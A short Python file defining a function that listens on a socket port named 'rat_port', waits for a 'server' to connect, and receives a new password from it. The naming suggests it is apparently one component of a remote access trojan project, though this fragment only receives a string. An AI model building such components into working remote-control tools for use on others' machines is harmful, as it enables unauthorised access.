import socket

from constants import *


def change_password():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # noqa

	s.bind((host, rat_port))
	s.listen()

	print("[*] Waiting for the server...")
	client, addr = s.accept()

	new_password = client.recv(MAX_PASSWORD_BYTES).decode()
	print(f"[*] Connection is established successfully")
	s.close()

	# print(new_password)
	return new_password
